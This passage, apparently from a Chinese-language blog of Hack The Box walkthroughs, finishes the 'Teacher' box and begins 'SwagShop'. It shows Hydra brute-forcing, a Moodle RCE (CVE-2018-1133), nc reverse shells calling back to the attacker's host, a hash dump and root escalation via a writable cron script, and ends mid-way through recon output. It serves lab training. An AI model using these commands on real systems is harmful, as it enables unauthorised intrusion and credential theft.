(c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-21 19:56:36<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 95 login tries (l:1/p:95), ~6 tries per task<br>[DATA] attacking http-post-form://10.10.10.153:80/moodle/login/index.php:anchor=&amp;username=^USER^&amp;password=^PASS^&amp;rememberusername=1:Invalid login<br>[80][http-post-form] host: 10.10.10.153   login: Giovanni   password: Th4C00lTheacha<span class="hljs-comment">#</span><br>1 of 1 target successfully completed, 16 valid passwords found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-21 19:56:38<br></code></pre></td></tr></table></figure><p>这WEB应用确实有个RCE的漏洞，利用倒是不难，但是可难找了，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://teacher.htb/moodle/question/question.php?courseid=2&amp;sesskey=DOqbmippKA&amp;qtype=calculated&amp;returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&amp;cmid=7&amp;category=2&amp;addonpage=0&amp;appendqnumstring=addquestion<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220821200240208.png" alt="image-20220821200240208"></p><p>漏洞的地方是在这里，漏洞编号为CVE-2018-1133，具体漏洞细节我就不复制粘贴了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://blog.sonarsource.com/moodle-remote-code-execution/?redirect=rips<br></code></pre></td></tr></table></figure><p>payload会因为后台错误交接直接演变为一个WebShell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://teacher.htb/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&amp;appendqnumstring=addquestion&amp;scrollpos=0&amp;<span class="hljs-built_in">id</span>=7&amp;wizardnow=datasetitems&amp;cmid=7&amp;0=ping%20-c%201%2010.10.16.3<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ sudo tcpdump -i tun0 icmp<br>tcpdump: verbose output suppressed, use -v[v]... <span class="hljs-keyword">for</span> full protocol decode<br>listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes<br>20:06:48.989982 IP teacher.htb &gt; 10.10.16.3: ICMP <span class="hljs-built_in">echo</span> request, <span class="hljs-built_in">id</span> 3291, <span class="hljs-built_in">seq</span> 1, length 64<br>20:06:48.990014 IP 10.10.16.3 &gt; teacher.htb: ICMP <span class="hljs-built_in">echo</span> reply, <span class="hljs-built_in">id</span> 3291, <span class="hljs-built_in">seq</span> 1, length 64<br>20:06:49.088302 IP teacher.htb &gt; 10.10.16.3: ICMP <span class="hljs-built_in">echo</span> request, <span class="hljs-built_in">id</span> 3293, <span class="hljs-built_in">seq</span> 1, length 64<br>20:06:49.088321 IP 10.10.16.3 &gt; teacher.htb: ICMP <span class="hljs-built_in">echo</span> reply, <span class="hljs-built_in">id</span> 3293, <span class="hljs-built_in">seq</span> 1, length 64<br></code></pre></td></tr></table></figure><p>编码反弹shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.16.3 1337 &gt;/tmp/f<br><br><span class="hljs-built_in">rm</span>%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.16.3%201337%20%3E%2Ftmp%2Ff<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ nc -lvnp 1337<br>listening on [any] 1337 ...<br>connect to [10.10.16.3] from (UNKNOWN) [10.10.10.153] 54248<br>sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ python3 -c &#x27;</span>import pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">www-data@teacher:/var/www/html/moodle/question$ ls</span><br><span class="hljs-string">ls</span><br><span class="hljs-string">addquestion.php     engine           move_form.php   toggleflag.php</span><br><span class="hljs-string">behaviour           export.php       preview.php     type</span><br><span class="hljs-string">category.php        export_form.php  previewlib.php  upgrade.php</span><br><span class="hljs-string">category_class.php  flags.js         qengine.js      upgrade.txt</span><br><span class="hljs-string">category_form.php   format           question.php    yui</span><br><span class="hljs-string">classes             format.php       renderer.php</span><br><span class="hljs-string">edit.php            import.php       templates</span><br><span class="hljs-string">editlib.php         import_form.php  tests</span><br><span class="hljs-string">www-data@teacher:/var/www/html/moodle/question$ </span><br></code></pre></td></tr></table></figure><p>刚刚是有拿到数据库泄露密码的，在moodle表里会有其他账号信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">MariaDB [moodle]&gt; <span class="hljs-keyword">select</span> username,password from mdl_user;<br><span class="hljs-keyword">select</span> username,password from mdl_user;<br>+-------------+--------------------------------------------------------------+<br>| username    | password                                                     |<br>+-------------+--------------------------------------------------------------+<br>| guest       | $2y$10<span class="hljs-variable">$ywuE5gDlAlaCu9R0w7pKW</span>.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |<br>| admin       | $2y$10<span class="hljs-variable">$7VPsdU9</span>/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |<br>| giovanni    | $2y$10<span class="hljs-variable">$38V6kI7LNudORa7lBAT0q</span>.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |<br>| Giovannibak | 7a860966115182402ed06375cf0a22af                             |<br>+-------------+--------------------------------------------------------------+<br>4 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><p>最后一个是可以破解出来了的：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220821201646229.png" alt="image-20220821201646229"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">MariaDB [moodle]&gt; <span class="hljs-built_in">exit</span><br><span class="hljs-built_in">exit</span><br>Bye<br>www-data@teacher:/var/www/html/moodle/question$ su giovanni<br>su giovanni<br>Password: expelled<br><br>giovanni@teacher:/var/www/html/moodle/question$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>addquestion.php     engine           move_form.php   toggleflag.php<br>behaviour           export_form.php  previewlib.php  <span class="hljs-built_in">type</span><br>category_class.php  export.php       preview.php     upgrade.php<br>category_form.php   flags.js         qengine.js      upgrade.txt<br>category.php        format           question.php    yui<br>classes             format.php       renderer.php<br>editlib.php         import_form.php  templates<br>edit.php            import.php       tests<br>giovanni@teacher:/var/www/html/moodle/question$ <span class="hljs-built_in">cd</span> ~<br><span class="hljs-built_in">cd</span> ~<br>giovanni@teacher:~$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>user.txt  work<br>giovanni@teacher:~$ <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">cat</span> user.txt<br>2ad1e90bef00ffafee595084962b4111<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">giovanni@teacher:~/work/tmp$ <span class="hljs-built_in">cat</span> /usr/bin/backup.sh<br><span class="hljs-built_in">cat</span> /usr/bin/backup.sh<br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">cd</span> /home/giovanni/work;<br>tar -czvf tmp/backup_courses.tar.gz courses/*;<br><span class="hljs-built_in">cd</span> tmp;<br>tar -xf backup_courses.tar.gz;<br><span class="hljs-built_in">chmod</span> 777 * -R;<br>giovanni@teacher:~/work/tmp$ <span class="hljs-built_in">ls</span> -l /usr/bin/backup.sh<br><span class="hljs-built_in">ls</span> -l /usr/bin/backup.sh<br>-rwxrwxrwx 1 root root 138 Jun 27  2018 /usr/bin/backup.sh<br>giovanni@teacher:~/work/tmp$ <span class="hljs-built_in">ln</span> -s /usr/bin/backup.sh<br><span class="hljs-built_in">ln</span> -s /usr/bin/backup.sh<br>giovanni@teacher:~/work/tmp$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>backup_courses.tar.gz  backup.sh  courses<br>giovanni@teacher:~/work/tmp$ <span class="hljs-built_in">cat</span> backup.sh<br><span class="hljs-built_in">cat</span> backup.sh<br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">cd</span> /home/giovanni/work;<br>tar -czvf tmp/backup_courses.tar.gz courses/*;<br><span class="hljs-built_in">cd</span> tmp;<br>tar -xf backup_courses.tar.gz;<br><span class="hljs-built_in">chmod</span> 777 * -R;<br>giovanni@teacher:~/work/tmp$ <span class="hljs-built_in">ls</span> -all<br><span class="hljs-built_in">ls</span> -all<br>total 16<br>drwxr-xr-x 3 giovanni giovanni 4096 Aug 21 14:19 .<br>drwxr-xr-x 4 giovanni giovanni 4096 Mar 21 15:29 ..<br>-rwxrwxrwx 1 root     root      259 Aug 21 14:20 backup_courses.tar.gz<br>lrwxrwxrwx 1 giovanni giovanni   18 Aug 21 14:19 backup.sh -&gt; /usr/bin/backup.sh<br>drwxrwxrwx 3 root     root     4096 Mar 21 15:29 courses<br>giovanni@teacher:~/work/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;nc -e /bin/bash 10.10.16.3 443&quot;</span> &gt;&gt; /usr/bin/backup.sh      &lt; -e /bin/bash 10.10.16.3 443<span class="hljs-string">&quot; &gt;&gt; /usr/bin/backup.sh</span><br><span class="hljs-string">giovanni@teacher:~/work/tmp$ cat /usr/bin/backup.sh</span><br><span class="hljs-string">cat /usr/bin/backup.sh</span><br><span class="hljs-string">#!/bin/bash</span><br><span class="hljs-string">cd /home/giovanni/work;</span><br><span class="hljs-string">tar -czvf tmp/backup_courses.tar.gz courses/*;</span><br><span class="hljs-string">cd tmp;</span><br><span class="hljs-string">tar -xf backup_courses.tar.gz;</span><br><span class="hljs-string">chmod 777 * -R;</span><br><span class="hljs-string">nc -e /bin/bash 10.10.16.3 443</span><br><span class="hljs-string">giovanni@teacher:~/work/tmp$ </span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ nc -lvnp 443 <br>listening on [any] 443 ...<br>connect to [10.10.16.3] from (UNKNOWN) [10.10.10.153] 40502<br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-built_in">cat</span> /root/root.txt<br>8b1..............................<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - SwagShop</title>
    <link href="/post/HackTheBox-SwagShop.html"/>
    <url>/post/HackTheBox-SwagShop.html</url>
    
    <content type="html"><![CDATA[<p>Hack The Box - SwagShop </p><p>目标IP为10.10.10.140：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">nmap -p- -Pn -sV -<span class="hljs-keyword">sC </span>-<span class="hljs-built_in">T4</span> <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">140</span><br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">Nmap</span> scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.140</span><br><span class="hljs-title class_">Host</span> is up (<span class="hljs-number">0.16</span>s latency).<br><span class="hljs-title class_">Not</span> <span class="hljs-symbol">shown:</span> <span class="hljs-number">65533</span> closed tcp ports (reset)<br><span class="hljs-title class_">PORT</span>   <span class="hljs-title class_">STATE</span> <span class="hljs-title class_">SERVICE</span> <span class="hljs-title class_">VERSION</span><br><span class="hljs-number">22</span>/tcp open  ssh     <span class="hljs-title class_">OpenSSH</span> <span class="hljs-number">7.2</span>p2 <span class="hljs-title class_">Ubuntu</span> <span class="hljs-number">4</span>ubuntu2.<span class="hljs-number">8</span> (<span class="hljs-title class_">Ubuntu</span> <span class="hljs-title class_">Linux</span>; protocol <span class="hljs-number">2.0</span>)<br>| ssh-<span class="hljs-symbol">hostkey:</span> <br>|   <span class="hljs-number">2048</span> <span class="hljs-symbol">b6:</span><span class="hljs-number">55</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">b:</span><span class="hljs-symbol">d2:</span><span class="hljs-number">4</span><span class="hljs-symbol">e:</span><span class="hljs-number">8</span><span class="hljs-symbol">f:</span><span class="hljs-symbol">a3:</span><span class="hljs-number">81</span><span class="hljs-symbol">:</span><span class="hljs-number">72</span><span class="hljs-symbol">:</span><span class="hljs-number">61</span><span class="hljs-symbol">:</span><span class="hljs-number">37</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">a:</span><span class="hljs-number">12</span><span class="hljs-symbol">:f6</span><span class="hljs-symbol">:</span><span class="hljs-number">24</span><span class="hljs-symbol">:ec</span> (<span class="hljs-title class_">RSA</span>)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">2</span><span class="hljs-symbol">e:</span><span class="hljs-number">30</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">a:</span><span class="hljs-number">92</span><span class="hljs-symbol">:f0</span><span class="hljs-symbol">:</span><span class="hljs-number">89</span><span class="hljs-symbol">:</span><span class="hljs-number">30</span><span class="hljs-symbol">:</span><span class="hljs-number">59</span><span class="hljs-symbol">:c1</span><span class="hljs-symbol">:</span><span class="hljs-number">77</span><span class="hljs-symbol">:</span><span class="hljs-number">56</span><span class="hljs-symbol">:ad</span><span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:c0</span><span class="hljs-symbol">:ba</span> (<span class="hljs-title class_">ECDSA</span>)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">4</span><span class="hljs-symbol">c:</span><span class="hljs-number">50</span><span class="hljs-symbol">:d5</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:</span><span class="hljs-number">70</span><span class="hljs-symbol">:c5</span><span class="hljs-symbol">:fd</span><span class="hljs-symbol">:c4</span><span class="hljs-symbol">:b2</span><span class="hljs-symbol">:f0</span><span class="hljs-symbol">:bc</span><span class="hljs-symbol">:</span><span class="hljs-number">42</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span><span class="hljs-symbol">:</span><span class="hljs-number">32</span><span class="hljs-symbol">:</span><span class="hljs-number">64</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span> (<span class="hljs-title class_">ED25519</span>)<br><span class="hljs-number">80</span>/tcp open  http    <span class="hljs-title class_">Apache</span> httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> ((<span class="hljs-title class_">Ubuntu</span>))<br>|_http-<span class="hljs-symbol">title:</span> <span class="hljs-title class_">Did</span> <span class="hljs-keyword">not</span> follow redirect to <span class="hljs-symbol">http:</span>//swagshop.htb/<br>|_http-server-<span class="hljs-symbol">header:</span> <span class="hljs-title class_">Apache</span>/<span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> (<span class="hljs-title class_">Ubuntu</span>)<br><span class="hljs-title class_">Service</span> <span class="hljs-symbol">Info:</span> <span class="hljs-symbol">OS:</span> <span class="hljs-title class_">Linux</span>; <span class="hljs-symbol">CPE:</span> <span class="hljs-symbol">cpe:</span>/<span class="hljs-symbol">o:</span><span class="hljs-symbol">linux:</span>linux_kernel<br><br><span class="hljs-title class_">Service</span> detection performed. <span class="hljs-title class_">Please</span> report any incorrect results at <span class="hljs-symbol">https:</span>//nmap.org/submit/ .<br><span class="hljs-title class_">Nmap</span> <span class="hljs-symbol">done:</span> <span class="hljs-number">1</span> <span class="hljs-title class_">IP</span> address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">485.25</span> seconds<br></code></pre></td></tr></table></figure><p>22端口有个用户名枚举的漏洞，但我并不想利用：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">searchsploit OpenSSH</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">OpenSSH</span> <span class="hljs-number">7</span>.<span class="hljs-number">2</span>p2 - Username Enumeration           | linux/remote/<span class="hljs-number">40136</span>.py<br></code></pre></td></tr></table></figure><p>访问80端口获取到如下页面：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408160715112.png" alt="image-20220408160715112"  /><p>Wappalyzer为我很好的枚举出了目标web页面的大致信息，Magento的Web应用程序，PHP语言环境，右下角有一个建议我输入邮箱订阅的输入框，并在页脚提醒了我站点的时间，2014：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408160942903.png" alt="image-20220408160942903"  /><p>我试图去点击页面为我提供的按钮，发现它跳转的URL规则：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>swagshop.htb<span class="hljs-regexp">/index.php/</span>customer<span class="hljs-regexp">/account/</span>login/<br>http:<span class="hljs-regexp">//</span>swagshop.htb<span class="hljs-regexp">/index.php/</span><span class="hljs-number">5</span>-x-hack-the-box-square-sticker.html?SID=rbc125sp335vg3tsv1qioob711<br>http:<span class="hljs-regexp">//</span>swagshop.htb<span class="hljs-regexp">/index.php/</span><span class="hljs-number">5</span>-x-hack-the-box-square-sticker.html?SID=rbc125sp335vg3tsv1qioob711<br></code></pre></td></tr></table></figure><p>无论点哪里的按钮，其路径都是在index.php下，然后我发现一个登录框：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408165303361.png" alt="image-20220408165303361"  /><p>但它看起并不像是管理人员使用的。我尝试搜寻Magento的相关漏洞，搜到了很多。但是我并没有目标Magento程序的具体版本号。我尝试对其进行路径爆破：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs awk">[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">21</span>] Starting:                                            <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">33</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">10</span>KB - /LICENSE.txt                                      <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">44</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">571</span>KB - /RELEASE_NOTES.txt                                <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">48</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">37</span>B  - /api.php                                          <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">48</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">310</span>B  - <span class="hljs-regexp">/app  -&gt;  http:/</span><span class="hljs-regexp">/swagshop.htb/</span>app/                <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">48</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - <span class="hljs-regexp">/app/</span>                                             <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">48</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">300</span>B  - <span class="hljs-regexp">/app/</span>.htaccess                                    <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">48</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">5</span>KB - <span class="hljs-regexp">/app/</span>etc/config.xml                               <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">48</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - <span class="hljs-regexp">/app/</span>etc/local.xml                                <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">48</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">9</span>KB - <span class="hljs-regexp">/app/</span>etc/local.xml.additional<br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">48</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - <span class="hljs-regexp">/app/</span>etc/local.xml.template                       <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">53</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">717</span>B  - /cron.sh                                          <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">53</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /cron.php                                         <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">57</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - <span class="hljs-regexp">/errors/</span>                                          <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">57</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">313</span>B  - <span class="hljs-regexp">/errors  -&gt;  http:/</span><span class="hljs-regexp">/swagshop.htb/</span>errors/          <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">58</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - /favicon.ico                                      <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">01</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">946</span>B  - <span class="hljs-regexp">/includes/</span>                                        <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">01</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">315</span>B  - <span class="hljs-regexp">/includes  -&gt;  http:/</span><span class="hljs-regexp">/swagshop.htb/i</span>ncludes/      <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">01</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">16</span>KB - /index.php                                        <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">01</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">44</span>B  - /install.php                                      <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">02</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">309</span>B  - <span class="hljs-regexp">/js  -&gt;  http:/</span><span class="hljs-regexp">/swagshop.htb/</span>js/                  <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">02</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">318</span>B  - <span class="hljs-regexp">/js/</span>tiny_mce  -&gt;  http:<span class="hljs-regexp">//</span>swagshop.htb<span class="hljs-regexp">/js/</span>tiny_mce/<br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">02</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">4</span>KB - <span class="hljs-regexp">/js/</span>tiny_mce/<br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">03</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">3</span>KB - <span class="hljs-regexp">/lib/</span>                                             <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">03</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">310</span>B  - <span class="hljs-regexp">/lib  -&gt;  http:/</span><span class="hljs-regexp">/swagshop.htb/</span>lib/<br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">06</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - <span class="hljs-regexp">/media/</span>                                           <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">06</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">312</span>B  - <span class="hljs-regexp">/media  -&gt;  http:/</span><span class="hljs-regexp">/swagshop.htb/m</span>edia/            <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">10</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">886</span>B  - /php.ini.sample                                   <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">12</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">314</span>B  - <span class="hljs-regexp">/pkginfo  -&gt;  http:/</span><span class="hljs-regexp">/swagshop.htb/</span>pkginfo/        <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">15</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">300</span>B  - /server-status                                    <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">15</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">301</span>B  - <span class="hljs-regexp">/server-status/</span>                                   <br>[<span class="hljs-number">16</span>:<span 